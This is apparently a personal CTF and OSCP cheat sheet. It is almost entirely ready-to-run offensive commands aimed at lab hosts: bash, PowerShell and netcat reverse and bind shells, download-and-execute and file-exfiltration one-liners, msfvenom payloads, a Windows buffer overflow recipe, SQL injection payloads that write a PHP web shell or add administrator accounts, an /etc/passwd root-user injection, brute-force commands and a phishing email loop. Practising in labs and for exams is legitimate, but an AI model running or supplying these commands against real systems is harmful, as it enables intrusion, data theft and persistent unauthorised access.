# CTF Notes
A list of notes that I've compiled over time to help with CTF's and the OSCP exam.

## Commands
Description | Command
------------ | -------------
| Download PowerCat onto Windows | 			Invoke-WebRequest https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -OutFile ./powercat.ps1 |
| Exfiltrate fil via powercat | 			powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1 |
| Send a reverse shell via powercat | 		powercat -c 10.11.0.4 -p 443 -e cmd.exe  |
| Bind shell to powercat listener | 		powercat -l -p 443 -e cmd.exe |
| Create encrypted stand alone powercat payload | 	powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps |
| Download file via powershell |  					powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" |
| Execute via powershell |  						wget.exe -V |
| Start bash script with | 					#!/bin/bash |
| Make a bash script executable | 			chmod +x script.sh |
| One liner to grep subdomains | 			grep -o '[^/]*\.megacorpone\.com' index.html \| sort -u > list.txt |
| Ping list of hosts in textfile | 			for url in $(cat list.txt); do host $url; done  |
| One liner to organize hosts in nmap scan | cat nmap-scan_10.11.1.1-254 \| grep 80 \| grep -v "Nmap" \| awk '{print $2}' |
| Take screenshot of hosts in nmap scan | 	for ip in $(cat nmap-scan_10.11.1.1-254 \| grep 80 \| grep -v "Nmap" \| awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done |
| Use gobuster to find directories | 		gobuster dir --url=http://10.10.10.68 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |
| Mounting NFS folder (discover through nmap) |	sudo mount -o nolock 10.11.1.72:/home ~/home/ |
| Search nmap scripts | 					cat /usr/share/nmap/scripts/script.db  \| grep '"vuln"\\|"exploit"' |
| Aggrssive Nmap scan | 					sudo nmap -n -sS -vv -A -T4 10.10.10.3 |
| SMB map | 								smbmap -u "" -p "" -d WORKGROUP -H 10.10.10.3 |
| XSS testing characters | 					<>'"{}; |
| Directory traversal check | 				c:\windows\system32\drivers\etc\host |
| LFI payload for log injection | 			<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> |
| LFT payload for injection via URL | 		data:text/plain,<?php echo shell_exec("dir") ?> #this will echo the output of the "dir" command |
| Xampp log location for LFI | 				c:\xampp\apache\logs\access.log&cmd=ipconfig |
| Buffer overflow pattern creater | 		msf-pattern_create -l 800 |
| Find offset of msf-pattern_create | 		msf-pattern_offset -l 800 -q 42306142 #that last number what filled the EIP from the buffer created with msf-pattern_create |
| Find op code equivalent of jmp esp | 		msf-nasm_shell |
| Show list of dll's in Immunity Debugger | !mona modules |
| Find all instances of jmp esp in dll | 	!mona find -s "\xff\xe4" -m "libspp.dll" |
| Generate shellcode with msfvenom | 		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.223 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" |
| Tomcat malicious war file | 				msfvenom -p java/shell_reverse_tcp lhost=192.168.119.223 lport=4444 -f war -o pwn.war |
| Kali web shells | 						/usr/share/webshells/ |
| Host your own smb server | 				sudo python3 smbserver.py share ~/Documents/smb |
| Cross compile windows script in linux | 	i686-w64-mingw32-gcc exploit.c -o exploit_output -lws2_32 |
| Upgrade to interactive shell in Netcat | 	python -c 'import pty; pty.spawn("/bin/bash")' |
| Copy nc.exe to local ftp folder | 		sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/ |
| Powershell one liner to download from Kali | powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.223/evil.exe', 'exploit.exe') |
| Download AND execute via powershell | 	powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.223/helloworld.ps1')  |
| Upload file from Windows to Kali | 		powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.223/upload.php', 'important.docx')  |
| Start apache (/var/www/html) | 			sudo service apache2 start/stop |
| Run tftp | 								sudo atftpd --daemon --port 69 /tftp/ |
| Transfer from Windows to Kali via tftp | 	tftp -i 192.168.119.223 put nc.exe (read this for more info https://forums.offensive-security.com/showthread.php?28651-16-2-5-Uploading-Files-with-TFTP&highlight=tftp) |
| Standalone reverse shell via msfvenom | 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.223 LPORT=4444 -f exe > binary.exe |
| Msfvenom for powershell | 				msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.223 LPORT=4444 -f powershell  |
| Change powershell policy to run scripts | Set-ExecutionPolicy -ExecutionPolicy Unrestricted CurrentUser |
| Start meterpreter (one liner) | 			sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.223; set LPORT 443; set AutoRunScript post/windows/manage/migrate; set ExitOnSession False;" -q |
| Type into meterpreter to keep session alive | 	set AutoRunScript post/windows/manage/migrate |
| Medusa htaccess password attack | 		medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin |
| RDP brute force with Crowbar | 			crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1  |
| SSH brute force with Hydra | 				hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1  |
| SSH brute force with Hydra on other port | hydra -f -l sunny -P /usr/share/wordlists/rockyou.txt -s 22022 10.10.10.76 ssh |
| HTTP POST attack with Hydra | 			hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PAS S^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f |
| Find what's using port 80 | 				netstat -tulpn \| grep :80 |
| Mount smb share locally | sudo mount -t cifs -o port=4455 //192.168.223.10/Data -o username=Administrator,password=lab /mnt/win10_share/ |
| Get an interactive shell from smiple shell | python -c 'import pty; pty.spawn("/bin/bash")' |
| Start ftp on Kali | 						sudo systemctl start pure-ftpd |
| GoBuster for vulnerabilities | 			gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,403,500' -e |
| GoBuster for directories | 				gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e |
| Scan a web server for Shellshock vuln | 	nmap 10.11.1.71 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi |
| Exploiting shellshock |	curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  nc  -h 2>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \ \| sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}' |
| Reverse shell through shellshock | 		curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/192.168.119.223/443 0>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi \| sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}' |
| If command returns nothing | 				add 2>&1 to the end, or  >/dev/null |
| Fix path if whoami isn't recognized | 	export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin |
| Get interactive windows shell | 			sudo rlwrap nc -nlvp 443 |
| Turn off Windows firewall (requires admin) | netsh advfirewall set allprofiles state off |
| Run windows process in the background | 	add cmd /c before the process |
| Mount SMB share | 						sudo mount //10.11.1.146/SusieShare ./mount/ -o username=" " |
| Unmount | 								umount /mnt |
| Switch to SMB1 | 							sudo nano /etc/samba/smb.conf and look for min protocol |
| Generate md5 in Windows 10 | 				`CertUtil -hashfile <path to file> MD5` |
| Escape lshell | 							echo os.system('/bin/bash') |
| Show mysql version from client | 			SHOW VARIABLES LIKE "%version%"; |
| Find what's using port 80 on windows | 	netstat -aon \| findstr :80 |
| LFI to shell | 							curl -X POST --data "<?php echo shell_exec(' /bin/bash -i >& /dev/tcp/192.168.119.223/8080 0>&1 ') ?>" "http://10.11.1.35/section.php?page=php://input" -k -v |
| Interact with MSSQL | 					sqsh -S 10.11.1.111:1433 -U sa -P sqls3rv3r -G 8.0 |
| Crack downloaded SAM and SYSTEM files | 	samdump2 |
| If tomcat is running, try this | 			msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.223 LPORT=80 -f raw > shell.jsp |
| Sherlock usage | 							powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}" |
| Reverse PowerShell | 						powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-PowerShellTcp.ps1}" |
| Shellshock usage | 						curl -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd " http://10.10.10.56/cgi-bin/user.sh |
| Scan cgi-bin for shellshock | 			gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi |
| Brute force post request via hydra | 		hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect" |
| DNS zone transfer | 						dig axfr @10.10.10.13 cronos.htb |
| If ssh'ing into rbash | 					ssh mindy@10.10.10.51 -t "bash --noprofile" |
| Expand tty rows and columns | 			stty cols 185 AND stty rows 49 |
| Create a binary without meterpreter | 	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.223 LPORT=443 -f exe > binary.exe |
| Download to Windows without powershell | 	certutil -urlcache -split -f http://192.168.119.223/binary.exe C:\\users\\public\\binary.exe |
| Crack zip file password | 				fcrackzip -uDp /usr/share/wordlists/rockyou.txt backup.zip |
| Create user through msfvenom payload | 	msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe |
| SSH Private key usage | 					chmod 600 THEN DO ssh -i username.key username@10.10.10.79 |
| If tar is available as sudo, run as other user |	sudo -u onuma /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash |
| Find file by name | 						find / -name *backuperer* 2>/dev/null |
| Run file with JuicyPotato | 				JuicyPotato.exe -l 1337 -p c:\inetpub\wwwroot\binary.exe -t * |
| Echo root2:evil into passwd file | 		echo 'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd' > test.txt |
| Forward Windows port with plink | 		cmd.exe /c echo y \| plink.exe -ssh -l kali -pw password -R 192.168.119.223:8888:127.0.0.1:8888 kali@192.168.119.223 |
| Mount NFS to local temp directory | 		sudo mount -t nfs 10.10.10.180:/site_backups ./temp -o nolock |
| Find subdomains | 						./ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://sneakycorp.htb/ -H "Host: FUZZ.sneakycorp.htb" -fs 185 |
| Send email to everyone | 					while read mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Credentials / Errors" --body "goto http://10.10.14.4/" --server 10.10.10.197; done < mails.txt	 |
| wpscan with ssl | 						wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate t --enumerate u --enumerate p |


## John the Ripper
### Crack shadow hash with john
1. sudo unshadow passwd.txt shadow.txt > passwords.txt
2. sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

### To crack ssh rsa key, convert to John format, then brute force										
1. /usr/share/john/ssh2john.py id_rsa > john.key
2. sudo john --format=raw-md5 /usr/share/wordlists/rockyou.txt id_john

## SSH Issues
If you get this response
```
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```
Try this: ssh sunny@10.10.10.76 -p 22022 -o KeXAlgorithms=diffie-hellman-group1-sha1

## CFIDE Cold Fusion Exploit Steps
1. If the CFIDE directory has been discovered, go to http://url/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
2. Copy the "password" value and enter it in the password field, but don't submit yet.
3. Hit control+shift+K to open the js console and type ```javascript:alert(hex_hmac_sha1(document.loginform.salt.value, document.loginform.cfadminPassword.value))```
4. Copy the content of the alert and have it ready.
5. Start forwarding to burp and submit the previously entered password.
6. In burp, change the cfadminPassword value to the content you copied from the alert.

## Simplified steps for Windows Buffer Overflow
1. Use python fuzzer and observe application in Immunity Debugger (the linux equivalent is Evans Debugger or edb)
2. Once the buffer has been determined, check the EIP register to make sure it's been overwritten with A's.
3. Once overwritten, use this to create a unique string in the buffer's length: ```msf-pattern_create -l 800```
4. Once the EIP has been overwritten with the new pattern, enter the contents here: ```msf-pattern_offset -l 800 -q 42306142```
5. Try overwriting the EIP register with B's to make sure the previou sstep returned correct results.
6. Once confirmed, check for bad characters using the following variable:
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```
7. Right click on ESP register and follow in dump to see which character it stopped at. Include \x00 since this is always bad. 
8. Repeat the process until all bad characters are removed from this variable, documented elsewhere, and the dump reaches \xff.
9. At this point, find a module to look for jmp esp instructions. Use msf-nasm_shell to find the hex equivalent of your desired instructions (e.g. jmp esp = FFE4)
10. In Immunity Debugger, check !mona modules for a DLL file that has Rebase, SafeSEH, ASLR, and NXCompat disabled. The base address for this DLL also can't include any bad characters. The linux equivalent is OpcodeSearcher.
11. Once you've found one, use this to look for the jmp esp instructions: ```!mona find -s "\xff\xe4" -m "libspp.dll"	```
12. Once you've found the address, use little endian format to replace the EIP variable in your script with it (e.g. 0x10090c83 = \x83\x0c\x09\x10)
13. Create a payload with your bad characters excluded: ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.223 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"```
14. Modify your payload to include 10 or so "nops" or \x90 before the shellcode. The payload order should go filler + eip + offset + nops + shellcode
15. Run a netcat listener on port 443 and execute python script.

* For windows shellcode: ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.223 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"```
* For linux shellcode: ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.223 LPORT=443 -b "\x00\x20" -f py -v shellcode```

## Use this script to monitor for scheduled processes running regularly:
```
#!/bin/bash

IFS=$'\n'

old_process=$(ps -eo command)

while true; do
   new_process=$(ps -eo command)
   diff <(echo "$old_process") <(echo "$new_process")
   sleep 1
   old_process=$new_process
done
```

## To find the DNS name of a server:
1. nslookup
2. server 10.10.10.13
3. 10.10.10.13

## If running webdav or IIS, try davtest. If it's successful, do this:
1. Copy a shell over as shell.txt
2. curl http://10.10.10.15/ --upload-file shell.txt
3. curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt

## To add a new Windows user:
   1) net users /add me mypassword123!
   2) net localgroup administrators me /add
   
## If nmap --interactive isn't available, try this:
   1) TF=$(mktemp)
   2) echo 'os.execute("/bin/sh")' > $TF
   3) sudo nmap --script=$TF
   
## Robots.txt
If robots.txt says permission denided, go to burp suite and change user agent to: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)


## Sql Injections
### MSSQL:

* If RDP is available, try this first
```
';EXECUTE master..xp_cmdshell 'net user abc 123456 /ADD'--
';EXECUTE master..xp_cmdshell 'net localgroup Administrators abc /ADD'--
```
Description | Command
------------ | -------------
| Find datbaases | 				',convert(int,(SELECT DB_NAME(6))))-- |
| Find databases? | 			',convert(int,(select top(1) schema_name from information_schema.schemata WHERE NOT schema_name IN ('dbo','db_accessadmin'))))-- |
| Find table names | 		',convert(int,(select top(1) table_name from information_schema.tables)))-- |
| Find columns | 			',convert(int,(select top(1) column_name from information_schema.columns WHERE table_name='users' AND NOT column_name IN ('user_id'))))-- |
| List table in other db | 		',convert(int,(SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U')))-- |
| List columns in other db | 	' + cast((SELECT top(1) name FROM archive..syscolumns WHERE name NOT IN ('alogin','id','psw')) as int) + ' |
| Read contents of a table | 	' + cast((SELECT top(1) alogin FROM archive..pmanager) as int) + 'test' OR 1=1-- 'UNION+ALL+SELECT+@@version,2-- |


### Oracle:
Description | Command
------------ | -------------
| List databases | 					' UNION ALL SELECT owner,'2',3 FROM all_tables -- |
| List tables in db | 				' UNION ALL SELECT table_name,'2',3 FROM all_tables WHERE owner='WEB_APP' -- |
| List columns in table | 			' UNION ALL SELECT column_name,'2',3 FROM all_tab_columns WHERE table_name='WEB_ADMINS' AND owner='WEB_APP' -- |
| Select column value in table | 	' UNION ALL SELECT PASSWORD,'2',3 FROM WEB_ADMINS -- |


### SQL Injection Enum
1. url.com/test?id='
2. url.com/test?id=1 order by 1, 1 order by 2, 1 order by 3, etc until an error is reached. The previous number is the number of columns available.
3. url.com/test?id=1 union all select 1,2,3 #has to be the same number of columns. use the column with most room for text to display @@version, user(), table_name from information_schema.tables, column_name from information_schema.column where table_name='users', etc
4. url.com/test?id=1 union all select 1, username, password from users 
5. url.com/test?id=1 union all select 1, 2, load_file('C:/Windows/System32 /drivers/etc/hosts') 
6. url.com/test?id=1 union all select 1, 2, "<?php echo shell_exec($_GET[' cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
7. url.com/backdoor.php?cmd=ipconfig

### SQLMap Commands
Description | Command
------------ | -------------
| Basic |												sqlmap -u http://url.com/debug.php?id=1 -p "id" |
| Dump database |										sqlmap -u http://url.com/debug.php?id=1 -p "id" --dbms=mysql --dump |
| Get a shell  |									sqlmap -u http://url.com/debug.php?id=1 -p "id" --dbms=mysql --os-shell |
| Post text file |									sqlmap -r search-test.txt -p tfUPass |

## Compare two files
```
curl -i 'http://path...' -s > before
curl -i 'http://path.../?list=../../../' -s > after
diff before after
```

## Automate FTP on Windows
```
C:\Users\offsec>echo open 192.168.119.223 21> ftp.txt 
C:\Users\offsec>echo USER offsec>> ftp.txt 
C:\Users\offsec>echo p@ssw0rd>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt 
C:\Users\offsec>echo GET nc.exe >> ftp.txt 
C:\Users\offsec>echo bye >> ftp.txt

C:\Users\offsec> ftp -v -n -s:ftp.txt
```

## Reverse Shells
### PowerShell Reverse Shell (Connect FROM this machine TO netcat )
```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) 
{
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
     $sendback = (iex $data 2>&1 | Out-String );
 	 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
     $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush(); 
} 
$client.Close(); 

One liner of the above code:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.223',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Binding Shell (Connect FROM netcat TO this machine)
```
$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
$listener.Stop();
```

### Echo shell into python
```
echo "import os" > tmp.py
echo "os.system('echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" >> /etc/passwd')" >> tmp.py
OR
echo "os.system('nc 10.10.14.32 1234 -e /bin/bash')" >> tmp.py


One liner of the above code:
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + '
```

## Transfering Files

### Transfer file from Kali to Windows using vbscript:
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo  Err.Clear >> wget.vbs 
echo  Set http = Nothing >> wget.vbs 
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo  http.Open "GET", strURL, False >> wget.vbs 
echo  http.Send >> wget.vbs 
echo  varByteArray = http.ResponseBody >> wget.vbs 
echo  Set http = Nothing >> wget.vbs 
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo  strData = "" >> wget.vbs 
echo  strBuffer = "" >> wget.vbs 
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```
* Then start server using: python -m SimpleHTTPServer 80
* Then execute on Windows: cscript wget.vbs http://192.168.119.223/evil.exe evil.exe

### Transfer file from Kali to Windows using Powershell:
```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.119.223/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1 

Then execute wget.ps1 on Windows
```

### Transfering file to Windows via exe2hex
1. Execute this command to reduce size: ```upx -9 nc.exe```
2. Execute this command to create a hex version of the exe: ```exe2hex -x nc.exe -p nc.cmd```
3. Copy the contents to the clipboard: ```cat nc.cmd | xclip -selection clipboard```
4. Paste in Windows shell to create EXE.

### Transfer files with netcat:
* On the receiving end
```nc -l -p 1234 > out.file```

* On the sending end running,
```nc -w 3 [destination] 1234 < out.file```

## Enumeration
### Enumeration Commands for Windows
Description | Command
------------ | -------------
| List users |  									net users |
| System version and architecture | 				systeminfo \| findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix" |
| Other info | 										systeminfo |
| Running processes and services | 					tasklist /SVC |
| Running processes and services w powershell | 	Get-WmiObject win32_service \| Select-Object Name, State, PathName \| Where-Object {$_.State -like 'Running'}  |
| Fix truncated | 									C:\Users\Bethany>powershell -Command "Get-WmiObject win32_service \| ?{$_.Name -like '*WinDef*'} \| select Name, State, PathName \| Format-Table -AutoSize" |
| Enumerate permissions of a process | 				icacls "C:\Program Files\Serviio\bin\ServiioService.exe" |
| Network config | 									ipconfig /all |
| Routing tables | 									route print |
| Active network connections | 						netstat -ano |
| Firewall status | 								netsh advfirewall show currentprofile |
| Firewall rules | 									netsh advfirewall firewall show rule name=all |
| Scheduled tasks | 								schtasks /query /fo LIST /v |
| Installed applications and versions | 			wmic product get name,version,vendor |
| Windows Patch Level | 							wmic qfe get Caption, Description, HotFixID, InstalledOn |
| Find folders you have access to | 				accesschk.exe -uws "Everyone" "C:\Program Files" |
| Same as above, with powershell only | 			Get-ChildItem "C:\Program Files" -Recurse | Get-ACL \| ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"} |
| Unmounted drives | 							mountvol |
| Device drivers and kernel modules | 				(From powershell) driverquery.exe /v /fo csv \| ConvertFrom-CSV \| Select-Object 'Display Name', 'Start Mode', Path |
| Drivers | 										driverquery /v |
| App version number | 								(From powershell)  Get-WmiObject Win32_PnPSignedDriver \| Select-Object DeviceName, DriverVersion, Manufacturer \| Where-Object {$_.DeviceName -like "*VMware*"} |
| "Always install elevated" registry 1 | 			reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installe |
| "Always install elevated" registry 2 | 			reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer |
| Automatic Enumeration | 							windows-privesc-check2.exe --dump -G |

### Enumeration Commands for Linux
Description | Command
------------ | -------------
| List users | 									cat /etc/passwd |
| System version and architecture | 			cat /etc/*-release |
| Kernel version and archiecture | 				uname -a |
| Running processes and services | 				ps axu |
| Network config | 								ifconfig or ip |
| Routing tables | 								routel or /sbin/route  |
| Active network connections | 					ss -anp or netstat -anp |
| Look for firewall rules as non-root | 		grep -Hs iptables /etc/* |
| Scheduled tasks | 							ls -lah /etc/cron* AND cat /etc/crontab |
| Cron jobs | 									grep "CRON" /var/log/cron.log |
| Installed applications | 						dpkg -l #Something to also keep in mind, anything that has been manually installed/compiled will NOT show up here (might want to check "/var/", "/opt/", "/usr/local/src" and "/usr/src/" for common places - else users home folder's or mounted external media etc!  |
| Find directories you can write to | 			find / - writeable -type d 2>/dev/null |
| Unmounted drives | 							mount AND cat /etc/fstab AND /bin/lsblk |
| Device drivers and kernel modules | 			lsmod |
| List commands | 								ps -e command |
| Find more info about app (e.g. libata) | 		/sbin/modinfo libata |
| Search for SUID files (see page 534) | 		find / -perm -u=s -type f 2>/dev/null |
| Automatic Enumeration | 						./unix-privesc-check standard > output.txt	 |
| Look for files owned at group level | 		find / -group adm 2>/dev/null (type id to see group name) |
| Look for files owned by root that we can write to |  find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null |
| If sudo -l reads (ALL, !root) /bin/bash, try this |  sudo -u#-1 /bin/bash |


What's the OS? What version? What architecture?
- cat /etc/*-release
- uname -i
- lsb_release -a (Debian based OSs)

Who are we? Where are we?
- id
- pwd

Who uses the box? What users? (And which ones have a valid shell)
- cat /etc/passwd
- grep -vE "nologin|false" /etc/passwd

What's currently running on the box? What active network services are there?
- ps aux
- netstat -antup

What's installed? What kernel is being used?
- dpkg -l (Debian based OSs) Something to also keep in mind, anything that has been manually installed/compiled will NOT show up here (might want to check "/var/", "/opt/", "/usr/local/src" and "/usr/src/" for common places - else users home folder's or mounted external media etc! 
- rpm -qa (CentOS / openSUSE )
- uname -a


## Privilege Escalation
### Windows Privilege Escalation
* Check for missing patches for exploitation: ``` wmic qfe get Caption,Description,HotFixID,InstalledOn ```

Description | Link
------------ | -------------
| PowerUp by harmj0y | 								https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc |
| Potato by foxglovesec | 							https://github.com/foxglovesec/Potato |
| Tater (powershell implementation of Potato) | 	https://github.com/Kevin-Robertson/Tater |
| SessionGopher | 									https://github.com/Arvanaghi/SessionGopher |
| Watson | 											https://github.com/rasta-mouse/Watson |

* Check ```whoami /priv``` 
